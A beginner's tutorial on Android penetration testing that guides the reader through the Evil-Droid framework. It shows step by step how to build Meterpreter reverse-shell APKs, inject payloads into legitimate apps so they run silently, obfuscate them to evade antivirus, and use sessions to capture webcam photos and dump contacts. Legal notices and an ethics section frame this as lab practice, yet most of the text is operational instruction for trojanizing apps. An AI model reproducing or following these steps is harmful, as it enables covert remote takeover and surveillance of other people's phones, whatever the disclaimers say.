# Android Penetration Testing - Beginner's Guide

## Table of Contents
1. [Prerequisites](#prerequisites)
2. [Understanding the Basics](#understanding-the-basics)
3. [Setting Up Your Lab Environment](#setting-up-your-lab-environment)
4. [Using Evil-Droid Framework](#using-evil-droid-framework)
5. [Understanding APK Structure](#understanding-apk-structure)
6. [Payload Types Explained](#payload-types-explained)
7. [Step-by-Step Walkthroughs](#step-by-step-walkthroughs)
8. [Best Practices & Ethics](#best-practices--ethics)

---

## Prerequisites

### What You Need
- **Kali Linux** (or similar penetration testing distro) - ✓ You have this
- **Root access** to run the framework
- **Internet connection** for downloading dependencies
- **Basic Linux command line knowledge**
- **Legal authorization** to test on devices you own

### Important Legal Notice
⚠️ **ONLY test on:**
- Your own devices
- Devices you have explicit written permission to test
- Isolated lab environments

**Unauthorized access to devices is ILLEGAL and can result in criminal charges.**

---

## Understanding the Basics

### What is Android Penetration Testing?

Android pentesting involves testing Android apps and devices for security vulnerabilities. Common goals:
- Finding security flaws in applications
- Testing for data leakage
- Evaluating permission models
- Testing network security
- Assessing encryption implementations

### What is a Payload?

A **payload** is code that executes when a vulnerability is exploited. In Evil-Droid:
- **Reverse TCP**: Creates connection back to your machine
- **Reverse HTTP/HTTPS**: Uses web protocols (harder to detect)
- **Meterpreter**: Advanced payload with many post-exploitation features

### What is APK Backdooring?

**Backdooring** means injecting malicious code into a legitimate app so:
1. The original app still works normally
2. Malicious code runs silently in background
3. Attacker gains remote access to the device

---

## Setting Up Your Lab Environment

### Option 1: Android Emulator (Recommended for Beginners)

1. **Install Android Studio:**
```bash
# Download from: https://developer.android.com/studio
# Or use snap
sudo snap install android-studio --classic
```

2. **Create Virtual Device:**
- Open Android Studio
- Tools → Device Manager
- Create Device → Select phone model
- Choose Android version (older versions like Android 7-9 work better for testing)
- Start the emulator

### Option 2: Physical Device (Advanced)

**Requirements:**
- Old Android phone you own
- USB debugging enabled
- Developer options unlocked

**Setup:**
```bash
# Install ADB tools
sudo apt install android-tools-adb android-tools-fastboot

# Connect phone via USB
# Enable USB debugging on phone (Settings → Developer Options)

# Verify connection
adb devices
```

### Option 3: Isolated Network (Most Realistic)

Create a separate test network:
- Use old router or create WiFi hotspot
- Connect test devices only to this network
- Prevents accidental exposure to other devices

---

## Using Evil-Droid Framework

### First Time Setup

1. **Navigate to Evil-Droid directory:**
```bash
cd /home/anon/projects/Evil-Droid
```

2. **Make script executable:**
```bash
chmod +x evil-droid
```

3. **Run the framework:**
```bash
sudo ./evil-droid
```

4. **What happens next:**
- Internet connection check
- Dependency verification and auto-installation
- Apache2 and PostgreSQL services start
- Main menu appears

### Understanding the Menu Options

```
[1] APK MSF - Generate standalone malicious APK
[2] BACKDOOR APK ORIGINAL (OLD) - Old method using msfvenom -x
[3] BACKDOOR APK ORIGINAL (NEW) - Advanced smali injection method
[4] BYPASS AV APK - Obfuscate payload to avoid antivirus detection
[5] START LISTENER - Open Metasploit handler to receive connections
[c] CLEAN - Remove generated files
[q] QUIT - Exit and stop services
```

---

## Understanding APK Structure

### What's Inside an APK?

An APK (Android Package) is essentially a ZIP file containing:

```
MyApp.apk
├── AndroidManifest.xml       # App permissions and components
├── classes.dex               # Compiled Java/Kotlin code
├── resources.arsc            # Compiled resources
├── res/                      # Images, layouts, strings
│   ├── drawable/
│   ├── layout/
│   └── values/
├── lib/                      # Native libraries
│   └── armeabi-v7a/
├── assets/                   # Raw asset files
└── META-INF/                 # Signing certificates
    ├── CERT.RSA
    ├── CERT.SF
    └── MANIFEST.MF
```

### What is Smali Code?

**Smali** is the human-readable form of Android's Dalvik bytecode:
- Original app is written in Java/Kotlin
- Compiled to DEX bytecode
- Decompiled to Smali for modification
- Recompiled back to DEX

**Example Smali snippet:**
```smali
.method public onCreate(Landroid/os/Bundle;)V
    .locals 1
    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V
    const v0, 0x7f030000
    invoke-virtual {p0, v0}, Lcom/example/app/MainActivity;->setContentView(I)V
    return-void
.end method
```

### Key Files Evil-Droid Modifies

1. **AndroidManifest.xml** - Adds dangerous permissions
2. **Smali files** - Injects payload execution code
3. **Resources** - Can change app name/icon

---

## Payload Types Explained

### Reverse TCP Payloads

**android/shell/reverse_tcp**
- Opens shell access to device
- Direct TCP connection
- Fastest but easily detected by firewalls

**android/meterpreter/reverse_tcp**
- Advanced post-exploitation framework
- File browsing, screenshot capture, keylogging
- More features than simple shell

### Reverse HTTP/HTTPS Payloads

**android/meterpreter/reverse_http**
- Uses HTTP protocol
- Blends with normal web traffic
- Bypasses some firewalls

**android/meterpreter/reverse_https**
- Encrypted HTTP connection
- Harder to detect and intercept
- Best for real-world scenarios

### Staged vs Non-Staged

**Staged** (e.g., `android/shell/reverse_tcp`):
- Small initial payload
- Downloads full payload after connection
- Better for size-constrained scenarios

**Non-Staged** (e.g., `android/meterpreter_reverse_tcp`):
- Complete payload included
- Larger APK size
- More reliable but easier to detect

---

## Step-by-Step Walkthroughs

### Walkthrough 1: Generate Simple Payload APK

**Objective:** Create basic malicious APK to understand the process

1. **Start Evil-Droid:**
```bash
sudo ./evil-droid
```

2. **Select Option 1** (APK MSF)

3. **Enter LHOST** (Your IP address):
```
# Find your IP
ip addr show
# Or
hostname -I
```
- Use local IP if testing on same network (e.g., 192.168.1.100)
- Use public IP if testing over internet (risky, not recommended)

4. **Enter LPORT** (Port number):
```
Default: 4444
You can use any port between 1024-65535
```

5. **Name your payload:**
```
Example: testapp
```

6. **Choose payload type:**
- For beginners: `android/meterpreter/reverse_tcp`

7. **Wait for generation:**
- APK will be created in `./evilapk/testapp.apk`

8. **Start the listener:**
- Select Option 5 from main menu
- Confirm LHOST and LPORT
- Choose same payload type
- Metasploit console opens

9. **Install APK on test device:**
```bash
# If using ADB
adb install ./evilapk/testapp.apk

# Or transfer via USB/email to physical device
```

10. **Open app on device:**
- App icon appears on device
- Open the app
- Connection appears in Metasploit console!

11. **Basic Meterpreter commands:**
```
meterpreter > sysinfo          # Device information
meterpreter > pwd              # Current directory
meterpreter > ls               # List files
meterpreter > webcam_snap      # Take photo (if has camera)
meterpreter > dump_contacts    # Export contacts
meterpreter > help             # Show all commands
```

### Walkthrough 2: Backdoor Legitimate APK

**Objective:** Hide payload inside real app (more realistic)

1. **Find a legitimate APK:**
```bash
# Download from APKMirror, APKPure (legal sources only)
# Or extract from your own device
adb pull /data/app/com.example.app/base.apk ./original.apk
```

2. **Start Evil-Droid:**
```bash
sudo ./evil-droid
```

3. **Select Option 3** (BACKDOOR APK ORIGINAL - NEW)

4. **Configure LHOST, LPORT, and name**

5. **Choose payload type**

6. **Select original APK:**
- File browser appears
- Navigate to your legitimate APK
- Select it

7. **Wait for processing:**
```
[*] Generating apk payload
[*] Decompiling Original APK...
[*] Decompiling Payload APK...
[*] Adding permission and Hook Smali
[*] Rebuilding Backdoored APK...
[*] Attempting to sign the package
[*] Aligning recompiled APK...
[✔] Done.
```

8. **What happened behind the scenes:**
- Original APK decompiled to smali code
- Payload APK decompiled
- Payload smali injected into original app's launcher activity
- Dangerous permissions added to AndroidManifest.xml
- APK recompiled and signed
- Result: App looks and works normally, but payload runs on launch

9. **Test the backdoored APK:**
- Start listener (Option 5)
- Install on test device
- Open the app
- Original app functions work normally
- Meterpreter session opens silently in background

### Walkthrough 3: Bypass Antivirus Detection

**Objective:** Obfuscate payload to avoid detection

1. **Select Option 4** (BYPASS AV APK)

2. **Configure LHOST, LPORT, name, and payload**

3. **Choose base type:**
- APK-MSF: Start from scratch
- ORIGINAL-APK: Backdoor existing app

4. **Select custom icon:**
- Browse to a PNG file
- Makes app look like legitimate app (e.g., game icon)

5. **Wait for obfuscation:**
```
[*] Scrubbing the payload contents to avoid AV signatures...
```

6. **What gets obfuscated:**
```
Original:
  com/metasploit/stage/Payload.smali

Obfuscated:
  com/xjfkwqpzmn/aqwplzmxbc/ghtywpqmzx.smali

Predictable strings replaced with random 10-character names
```

7. **Test against antivirus:**
```bash
# Upload to VirusTotal (only for learning, don't upload real payloads)
# Compare detection rates before/after obfuscation
```

---

## Best Practices & Ethics

### Legal Requirements

✅ **DO:**
- Test only on devices you own
- Get written permission for client devices
- Work in isolated lab environments
- Document all testing activities
- Follow responsible disclosure if you find vulnerabilities

❌ **DON'T:**
- Test on public devices
- Deploy payloads on friends' phones "as a joke"
- Upload generated APKs to app stores
- Use on production systems
- Share malicious APKs publicly

### Technical Best Practices

1. **Use Isolated Networks:**
   - Separate WiFi network for testing
   - Virtual machines when possible
   - Never mix test and production networks

2. **Secure Your Attack Machine:**
   - Use strong passwords
   - Encrypt your disk
   - Keep Kali Linux updated
   - Use VPN when appropriate

3. **Clean Up After Testing:**
```bash
# In Evil-Droid menu, select 'c' to clean
# Or manually:
rm -rf ./evilapk/*
rm -rf ./payload/
rm -rf ./original/
```

4. **Document Everything:**
   - Keep testing logs
   - Screenshot findings
   - Note what worked/failed
   - Build your knowledge base

### Learning Path

**Beginner (Month 1-2):**
- Generate basic payloads
- Understand APK structure
- Learn Meterpreter basics
- Practice on emulators only

**Intermediate (Month 3-6):**
- Backdoor legitimate apps
- Study smali code injection
- Learn AV bypass techniques
- Test on old physical devices you own

**Advanced (Month 6+):**
- Analyze antivirus detection methods
- Custom payload development
- Combine with social engineering (ethical only)
- Contribute to security research

### Resources for Continued Learning

**Books:**
- "Android Hacker's Handbook" by Joshua J. Drake
- "The Mobile Application Hacker's Handbook" by Dominic Chell

**Online Courses:**
- eLearnSecurity Mobile Application Penetration Tester (eMAPT)
- Offensive Security Mobile Pentesting (OSMP)

**Practice Platforms:**
- OWASP Mobile Security Testing Guide
- AndroGoat (Vulnerable Android app for practice)
- InsecureBank v2

**Communities:**
- r/netsec
- XDA Developers Security Forum
- OWASP Mobile Security Project

---

## Troubleshooting Common Issues

### Issue: "Failed to rebuild backdoored apk"

**Causes:**
- Original APK uses advanced protection
- Incompatible Android version
- Corrupted APK file

**Solutions:**
```bash
# Try older Android version APK
# Use Option 2 (OLD method) instead
# Check apktool version
apktool --version
```

### Issue: No connection in Metasploit

**Causes:**
- Wrong LHOST/LPORT
- Firewall blocking connection
- Device not connected to network

**Solutions:**
```bash
# Check firewall
sudo ufw status
sudo ufw allow 4444/tcp

# Verify LHOST is correct
ip addr show

# Test connectivity
ping [device-ip]
```

### Issue: APK won't install on device

**Causes:**
- "Install from unknown sources" disabled
- Signing certificate issues
- Insufficient storage

**Solutions:**
- Enable "Unknown Sources" in device settings
- Check device has free space
- Try different signing method

---

## Next Steps

Once you're comfortable with the basics:

1. **Study the source code:**
```bash
# Read the main script
less evil-droid

# Understand each function
# Learn how smali injection works
```

2. **Experiment with modifications:**
   - Change obfuscation patterns
   - Add custom permissions
   - Create different payload variants

3. **Learn defensive techniques:**
   - How to detect backdoored APKs
   - Analyze apps for malware
   - Understand Android security mechanisms

4. **Contribute to security:**
   - Report vulnerabilities responsibly
   - Help improve Android security
   - Share knowledge ethically

---

## Summary

**Key Takeaways:**
- Always get authorization before testing
- Start with emulators and isolated environments
- Understand what tools do before using them
- Focus on learning, not causing harm
- Build skills progressively from basic to advanced

**Your First Goal:**
Successfully generate a payload, deploy it to an emulator you control, and establish a Meterpreter session. Once you can do this reliably, you understand the fundamentals!

Good luck with your ethical hacking journey! 🛡️
